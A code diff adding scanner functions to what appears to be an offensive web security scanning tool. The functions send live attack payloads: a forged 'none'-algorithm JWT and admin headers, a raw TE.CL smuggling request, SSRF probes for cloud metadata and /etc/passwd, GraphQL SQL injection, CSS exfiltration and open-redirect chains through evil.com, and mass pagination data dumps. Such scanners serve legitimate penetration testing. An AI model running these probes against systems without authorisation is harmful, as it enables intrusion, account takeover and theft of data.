@@ -4978,3 +4978,499 @@ def scan_context_aware_sqli(crawl_data):
                             break
                 except: continue
     return findings
+
+
+# ---------------------------------------------------------------------------
+# ELITE BATCH 5: Subdomain brute-force, response diffing auth bypass,
+#                Next.js/React specific, GraphQL mutation fuzzing,
+#                TE.CL smuggling, IDOR pagination
+# ---------------------------------------------------------------------------
+
+_DNS_WORDLIST = [
+    "api","app","admin","dev","staging","test","beta","internal","corp","vpn",
+    "mail","smtp","ftp","ssh","git","gitlab","jenkins","jira","confluence",
+    "portal","dashboard","login","auth","sso","oauth","id","identity",
+    "cdn","static","assets","media","upload","files","storage","backup",
+    "db","database","mysql","postgres","redis","mongo","elastic","kibana",
+    "grafana","prometheus","metrics","logs","monitor","status","health",
+    "api2","api-v2","api-v1","v1","v2","v3","legacy","old","new","next",
+    "mobile","m","wap","web","www2","www3","secure","ssl","shop","store",
+    "blog","news","docs","help","support","kb","wiki","forum","community",
+    "sandbox","qa","uat","preprod","pre-prod","prod","production","live",
+    "office","intranet","extranet","remote","vpn2","citrix","rdp","ws",
+    "socket","ws","wss","push","notify","webhook","callback","events",
+    "search","suggest","autocomplete","typeahead","graphql","gql","rest",
+    "microservice","service","services","gateway","proxy","lb","loadbalancer",
+]
+
+def scan_subdomain_bruteforce(target):
+    """DNS brute-force subdomain enumeration — finds what cert transparency misses."""
+    import socket
+    findings = []
+    found = []
+    domain_parts = target.split(".")
+    base = ".".join(domain_parts[-2:]) if len(domain_parts) >= 2 else target
+
+    def resolve(sub):
+        fqdn = f"{sub}.{base}"
+        try:
+            ips = socket.getaddrinfo(fqdn, None, socket.AF_INET)
+            if ips:
+                return fqdn, ips[0][4][0]
+        except socket.gaierror:
+            pass
+        return None, None
+
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    with ThreadPoolExecutor(max_workers=50) as pool:
+        futures = {pool.submit(resolve, w): w for w in _DNS_WORDLIST}
+        for future in as_completed(futures):
+            fqdn, ip = future.result()
+            if fqdn:
+                found.append(fqdn)
+                findings.append({"type": "Subdomain Found (Brute-Force)",
+                                 "severity": "info", "url": f"https://{fqdn}",
+                                 "detail": f"{fqdn} → {ip}",
+                                 "template": "apex-subdomain-brute"})
+    return findings, found
+
+
+def scan_response_diff_auth_bypass(crawl_data):
+    """Response diffing — detect auth bypass by comparing authenticated vs unauthenticated responses."""
+    findings = []
+    auth_paths = ["/admin","/dashboard","/api/admin","/api/users","/api/config",
+                  "/internal","/management","/api/v1/users","/api/me","/profile"]
+    for page in crawl_data.get("pages",[])[:3]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        for path in auth_paths:
+            url = f"{base}{path}"
+            try:
+                # Request without auth
+                r1 = _S.get(url, timeout=5)
+                # Request with fake auth headers
+                r2 = _S.get(url, timeout=5, headers={
+                    "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
+                    "X-Auth-Token": "admin",
+                    "X-User-Id": "1",
+                    "X-Role": "admin",
+                })
+                # If fake auth returns more content, it's a bypass
+                if (r2.status_code == 200 and r1.status_code in (401,403) and
+                        len(r2.content) > 100):
+                    findings.append({"type": "Auth Bypass via Fake Token",
+                                     "severity": "critical", "url": url,
+                                     "detail": f"Fake JWT/token returns 200 on {path}",
+                                     "template": "apex-auth-diff"})
+                elif (r1.status_code == r2.status_code == 200 and
+                      abs(len(r1.content) - len(r2.content)) > 500):
+                    # Same status but different content — possible privilege escalation
+                    findings.append({"type": "Response Diff on Auth Headers",
+                                     "severity": "medium", "url": url,
+                                     "detail": f"Auth headers change response by {abs(len(r1.content)-len(r2.content))}b",
+                                     "template": "apex-auth-diff"})
+            except: continue
+    return findings
+
+
+def scan_nextjs_react_vulns(crawl_data, web_targets):
+    """Next.js / React specific vulnerabilities."""
+    findings = []
+    for target in web_targets[:3]:
+        # Next.js: /_next/static/chunks/ may expose source maps
+        try:
+            r = _S.get(f"{target}/_next/static/chunks/", timeout=5)
+            if r.status_code == 200 and ".js" in r.text:
+                findings.append({"type": "Next.js Chunk Directory Listing",
+                                 "severity": "medium", "url": f"{target}/_next/static/chunks/",
+                                 "detail": "Next.js chunks directory is listable",
+                                 "template": "apex-nextjs"})
+        except: pass
+        # Next.js: __NEXT_DATA__ leaks server-side props
+        try:
+            r = _S.get(target, timeout=5)
+            next_data = re.search(r'<script id="__NEXT_DATA__"[^>]*>({.*?})</script>', r.text, re.DOTALL)
+            if next_data:
+                import json as _j
+                data = _j.loads(next_data.group(1))
+                data_str = str(data)
+                if any(x in data_str.lower() for x in ["password","secret","token","key","api","internal","private"]):
+                    findings.append({"type": "Next.js __NEXT_DATA__ Sensitive Leak",
+                                     "severity": "high", "url": target,
+                                     "detail": "Sensitive data in __NEXT_DATA__ server props",
+                                     "template": "apex-nextjs"})
+        except: pass
+        # Next.js: /api/ routes without auth
+        for route in ["/api/user","/api/users","/api/me","/api/auth/session",
+                      "/api/admin","/api/config","/api/env"]:
+            try:
+                r = _S.get(f"{target}{route}", timeout=3)
+                if r.status_code == 200:
+                    try:
+                        data = r.json()
+                        if isinstance(data, dict) and any(k in str(data).lower()
+                                for k in ["email","user","token","session","secret"]):
+                            findings.append({"type": f"Next.js API Route Exposed: {route}",
+                                             "severity": "high", "url": f"{target}{route}",
+                                             "detail": "Next.js API route returns sensitive data without auth",
+                                             "template": "apex-nextjs"})
+                    except: pass
+            except: continue
+        # React: dangerouslySetInnerHTML sources in JS
+        try:
+            r = _S.get(target, timeout=5)
+            if "dangerouslySetInnerHTML" in r.text:
+                findings.append({"type": "React dangerouslySetInnerHTML Usage",
+                                 "severity": "medium", "url": target,
+                                 "detail": "dangerouslySetInnerHTML found — potential DOM XSS if user-controlled",
+                                 "template": "apex-react"})
+        except: pass
+    return findings
+
+
+def scan_graphql_mutation_fuzzing(crawl_data):
+    """Fuzz GraphQL mutations for injection, IDOR, and missing auth."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[])[:3]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/graphql","/api/graphql","/gql"]:
+            url = f"{base}{path}"
+            # Get schema via introspection
+            try:
+                r = _S.post(url, json={"query":"{__schema{mutationType{fields{name args{name type{name kind ofType{name}}}}}}}"},
+                           headers={"Content-Type":"application/json"}, timeout=5)
+                if r.status_code != 200: continue
+                data = r.json()
+                mutations = (data.get("data",{}).get("__schema",{})
+                             .get("mutationType",{}) or {}).get("fields",[]) or []
+                for mut in mutations[:10]:
+                    name = mut.get("name","")
+                    args = mut.get("args",[])
+                    # Build a test mutation
+                    arg_str = " ".join(f'{a["name"]}: "test"' for a in args[:3])
+                    test_query = f'mutation {{ {name}({arg_str}) {{ id }} }}'
+                    try:
+                        r2 = _S.post(url, json={"query": test_query},
+                                    headers={"Content-Type":"application/json"}, timeout=5)
+                        body = r2.text.lower()
+                        # Check for SQLi in mutation
+                        sqli_test = f'mutation {{ {name}({arg_str.replace("test", "test\\' OR \\'1\\'=\\'1")}) {{ id }} }}'
+                        r3 = _S.post(url, json={"query": sqli_test},
+                                    headers={"Content-Type":"application/json"}, timeout=5)
+                        if any(e in r3.text.lower() for e in ["sql","syntax","mysql","ora-","pg_"]):
+                            findings.append({"type": f"GraphQL Mutation SQLi: {name}",
+                                             "severity": "critical", "url": url,
+                                             "detail": f"SQL error in mutation {name}",
+                                             "template": "apex-gql-mutation"})
+                        # Check if mutation works without auth
+                        if r2.status_code == 200 and "errors" not in body and name.lower() in (
+                                "createuser","deleteuser","updateuser","createadmin","resetpassword",
+                                "changepassword","updateemail","deleteaccount","createtoken"):
+                            findings.append({"type": f"GraphQL Mutation Without Auth: {name}",
+                                             "severity": "critical", "url": url,
+                                             "detail": f"Sensitive mutation {name} accessible without authentication",
+                                             "template": "apex-gql-mutation"})
+                    except: continue
+            except: continue
+    return findings
+
+
+def scan_te_cl_smuggling(web_targets):
+    """TE.CL HTTP request smuggling — Transfer-Encoding takes priority over Content-Length."""
+    findings = []
+    import socket, ssl as _ssl
+    for target in web_targets[:5]:
+        try:
+            parsed = urllib.parse.urlparse(target)
+            host = parsed.netloc.split(":")[0]
+            port = 443 if parsed.scheme == "https" else 80
+            path = parsed.path or "/"
+
+            # TE.CL: server uses TE, backend uses CL
+            payload = (
+                f"POST {path} HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Transfer-Encoding: chunked\r\n"
+                f"Content-Length: 4\r\n"
+                f"\r\n"
+                f"5c\r\n"
+                f"GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n"
+                f"0\r\n\r\n"
+            ).encode()
+
+            sock = socket.create_connection((host, port), timeout=5)
+            if port == 443:
+                ctx = _ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = _ssl.CERT_NONE
+                sock = ctx.wrap_socket(sock, server_hostname=host)
+            sock.settimeout(8)
+            sock.send(payload)
+            resp = b""
+            try:
+                while True:
+                    chunk = sock.recv(4096)
+                    if not chunk: break
+                    resp += chunk
+            except: pass
+            sock.close()
+            resp_str = resp.decode("utf-8", errors="ignore")
+            # If we get two responses or a 400 on the smuggled request
+            if resp_str.count("HTTP/1.1") >= 2 or "GPOST" in resp_str:
+                findings.append({"type": "HTTP Request Smuggling (TE.CL)",
+                                 "severity": "critical", "url": target,
+                                 "detail": "TE.CL desync — two responses received for one request",
+                                 "template": "apex-smuggling-tecl"})
+        except: continue
+    return findings
+
+
+def scan_idor_pagination(crawl_data):
+    """IDOR via API pagination — ?page=0&limit=9999 dumps all records."""
+    findings = []
+    for url, params in crawl_data.get("params",{}).items():
+        has_page = any(p.lower() in ("page","offset","skip","start","from","cursor") for p in params)
+        has_limit = any(p.lower() in ("limit","size","count","per_page","pagesize","take") for p in params)
+        if not (has_page or has_limit): continue
+        try:
+            parsed = urllib.parse.urlparse(url)
+            qs = urllib.parse.parse_qs(parsed.query)
+            # Try to dump everything
+            for p in list(qs.keys()):
+                if p.lower() in ("limit","size","count","per_page","pagesize","take"):
+                    qs[p] = ["9999"]
+                if p.lower() in ("page","offset","skip","start","from"):
+                    qs[p] = ["0"]
+            test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+            r = _S.get(test_url, timeout=10)
+            if r.status_code == 200:
+                try:
+                    data = r.json()
+                    count = len(data) if isinstance(data, list) else len(data.get("data",data.get("items",data.get("results",[]))))
+                    if count > 100:
+                        has_sensitive = any(k in str(data).lower() for k in
+                                           ["email","phone","ssn","credit","password","token","secret"])
+                        sev = "critical" if has_sensitive else "high"
+                        findings.append({"type": "IDOR via Pagination (Mass Data Exposure)",
+                                         "severity": sev, "url": test_url,
+                                         "detail": f"limit=9999 returns {count} records",
+                                         "template": "apex-idor-pagination"})
+                except: pass
+        except: continue
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# ELITE BATCH 6: Race condition on registration, timing-based user enum,
+#                CSS exfil, open redirect → OAuth chain,
+#                SSRF via PDF/image generation, NS takeover
+# ---------------------------------------------------------------------------
+
+def scan_race_condition_registration(crawl_data):
+    """Race condition on registration — create duplicate accounts or bypass limits."""
+    import concurrent.futures as _cf
+    findings = []
+    for page in crawl_data.get("pages",[]):
+        url = page["url"]
+        if not any(x in url.lower() for x in ["register","signup","join","create-account"]): continue
+        base = "/".join(url.split("/",3)[:3])
+        for path in ["/register","/signup","/api/register","/api/signup","/api/v1/register"]:
+            endpoint = f"{base}{path}"
+            uid = int(time.time()) % 100000
+            payload = {"email": f"race{uid}@test.com", "username": f"race{uid}",
+                       "password": "Test1234!", "name": "Race Test"}
+            def attempt(_):
+                try:
+                    return _S.post(endpoint, json=payload, timeout=5)
+                except: return None
+            # Fire 10 simultaneous requests
+            with _cf.ThreadPoolExecutor(max_workers=10) as pool:
+                results = list(pool.map(attempt, range(10)))
+            success = [r for r in results if r and r.status_code in (200,201)]
+            if len(success) > 1:
+                findings.append({"type": "Race Condition on Registration",
+                                 "severity": "high", "url": endpoint,
+                                 "detail": f"{len(success)}/10 parallel registrations succeeded — duplicate account possible",
+                                 "template": "apex-race-reg"})
+                break
+    return findings
+
+
+def scan_timing_user_enumeration(crawl_data):
+    """Timing-based user enumeration — valid usernames take longer to process."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[]):
+        if not any(x in page["url"].lower() for x in ["login","signin","auth"]): continue
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/login","/api/login","/auth/login","/signin","/api/signin"]:
+            url = f"{base}{path}"
+            try:
+                times_valid, times_invalid = [], []
+                for _ in range(5):
+                    start = time.time()
+                    _S.post(url, json={"email":"admin@admin.com","password":"wrongpassword_xyz"}, timeout=5)
+                    times_valid.append(time.time() - start)
+                    start = time.time()
+                    _S.post(url, json={"email":f"nonexistent_{int(time.time())}@xyz123.com","password":"wrongpassword_xyz"}, timeout=5)
+                    times_invalid.append(time.time() - start)
+                avg_valid = sum(times_valid) / len(times_valid)
+                avg_invalid = sum(times_invalid) / len(times_invalid)
+                diff = abs(avg_valid - avg_invalid)
+                if diff > 0.1:  # 100ms timing difference
+                    findings.append({"type": "Timing-Based User Enumeration",
+                                     "severity": "medium", "url": url,
+                                     "detail": f"Valid user avg {avg_valid:.3f}s vs invalid {avg_invalid:.3f}s — {diff*1000:.0f}ms difference",
+                                     "template": "apex-timing-enum"})
+            except: continue
+    return findings
+
+
+def scan_css_exfil(crawl_data):
+    """CSS injection data exfiltration via attribute selectors."""
+    findings = []
+    # CSS that exfiltrates CSRF tokens via attribute selectors
+    # input[name="csrf"][value^="a"] { background: url(https://evil.com/?c=a) }
+    css_payload = "}</style><style>input[type=hidden]{background:url(https://evil.com/css-exfil)}"
+    for url, params in crawl_data.get("params",{}).items():
+        for p in params:
+            if not any(x in p.lower() for x in ["style","css","theme","color","class","skin","template"]): continue
+            try:
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                qs[p] = [css_payload]
+                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                r = _S.get(test_url, timeout=_TIMEOUT)
+                if "css-exfil" in r.text and "text/html" in r.headers.get("content-type",""):
+                    findings.append({"type": "CSS Injection Data Exfiltration",
+                                     "severity": "high", "url": test_url,
+                                     "detail": f"CSS injected via '{p}' — can exfiltrate CSRF tokens via attribute selectors",
+                                     "template": "apex-css-exfil"})
+                    break
+            except: continue
+    return findings
+
+
+def scan_open_redirect_oauth_chain(crawl_data):
+    """Chain open redirect → OAuth redirect_uri bypass → account takeover."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[])[:5]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        # Find open redirects first
+        redirect_params = ("url","redirect","next","return","goto","dest","continue")
+        open_redirects = []
+        for url, params in crawl_data.get("params",{}).items():
+            if not url.startswith(base): continue
+            for p in params:
+                if p.lower() not in redirect_params: continue
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = ["https://evil.com"]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=5, allow_redirects=False)
+                    if "evil.com" in r.headers.get("Location",""):
+                        open_redirects.append(test_url)
+                except: continue
+        if not open_redirects: continue
+        # Now check if OAuth uses this domain as redirect_uri
+        for oauth_path in ["/oauth/authorize","/oauth2/authorize","/auth/oauth","/connect/authorize"]:
+            try:
+                r = _S.get(f"{base}{oauth_path}", timeout=5, allow_redirects=False)
+                if r.status_code in (200,302,400):
+                    # Try to use open redirect as redirect_uri
+                    chain_url = f"{base}{oauth_path}?client_id=test&response_type=code&redirect_uri={urllib.parse.quote(open_redirects[0])}"
+                    r2 = _S.get(chain_url, timeout=5, allow_redirects=False)
+                    loc = r2.headers.get("Location","")
+                    if "evil.com" in loc or open_redirects[0].split("?")[0] in loc:
+                        findings.append({"type": "Open Redirect → OAuth Chain (Account Takeover)",
+                                         "severity": "critical", "url": chain_url,
+                                         "detail": f"OAuth redirect_uri accepts open redirect — auth code leaks to attacker",
+                                         "template": "apex-redirect-oauth"})
+            except: continue
+    return findings
+
+
+def scan_ssrf_pdf_generation(crawl_data):
+    """SSRF via PDF/image generation endpoints — wkhtmltopdf, PhantomJS, ImageMagick."""
+    findings = []
+    pdf_paths = ["/api/pdf","/api/export/pdf","/api/generate/pdf","/export",
+                 "/api/screenshot","/api/render","/api/preview","/api/thumbnail",
+                 "/api/convert","/api/image","/api/og-image","/api/social-image",
+                 "/pdf","/screenshot","/render","/preview"]
+    ssrf_payloads = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://localhost/",
+        "file:///etc/passwd",
+        "http://0.0.0.0:22",
+    ]
+    for page in crawl_data.get("pages",[])[:3]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        for path in pdf_paths:
+            url = f"{base}{path}"
+            for payload in ssrf_payloads[:2]:
+                try:
+                    # Try GET with url param
+                    for p in ["url","src","source","link","page","target","uri"]:
+                        r = _S.get(f"{url}?{p}={urllib.parse.quote(payload)}", timeout=8)
+                        if r.status_code == 200 and len(r.content) > 100:
+                            content_type = r.headers.get("content-type","").lower()
+                            if any(x in content_type for x in ["pdf","image","octet"]):
+                                findings.append({"type": "SSRF via PDF/Image Generation",
+                                                 "severity": "critical", "url": f"{url}?{p}={payload}",
+                                                 "detail": f"PDF/image generator fetches {payload}",
+                                                 "template": "apex-ssrf-pdf"})
+                                break
+                            if any(x in r.text for x in ["root:","ami-id","instance-id"]):
+                                findings.append({"type": "SSRF via PDF Generation (Content Confirmed)",
+                                                 "severity": "critical", "url": f"{url}?{p}={payload}",
+                                                 "detail": "SSRF confirmed — internal content in response",
+                                                 "template": "apex-ssrf-pdf"})
+                                break
+                    # Try POST
+                    for p in ["url","src","source","link","page","target","uri","html"]:
+                        r = _S.post(url, json={p: payload}, timeout=8,
+                                   headers={"Content-Type":"application/json"})
+                        if r.status_code == 200 and any(x in r.text for x in ["root:","ami-id"]):
+                            findings.append({"type": "SSRF via PDF Generation (POST)",
+                                             "severity": "critical", "url": url,
+                                             "detail": f"POST {p}={payload} — SSRF confirmed",
+                                             "template": "apex-ssrf-pdf"})
+                            break
+                except: continue
+    return findings
+
+
+def scan_ns_takeover(target, subdomains):
+    """Subdomain takeover via dangling NS records — not just CNAME."""
+    import subprocess as _sp
+    findings = []
+    for sub in subdomains[:30]:
+        try:
+            # Check NS records
+            ns_result = _sp.run(["dig","+short","NS",sub],
+                               capture_output=True, text=True, timeout=5)
+            ns_records = [n.rstrip(".") for n in ns_result.stdout.splitlines() if n.strip()]
+            if not ns_records: continue
+            # Check if NS servers resolve
+            for ns in ns_records:
+                try:
+                    import socket
+                    socket.getaddrinfo(ns, None)
+                except socket.gaierror:
+                    # NS server doesn't resolve — potential takeover
+                    findings.append({"type": "NS Subdomain Takeover",
+                                     "severity": "critical", "url": f"dns://{sub}",
+                                     "detail": f"NS record {ns} doesn't resolve — NS takeover possible",
+                                     "template": "apex-ns-takeover"})
+                    break
+        except: continue
+    return findings
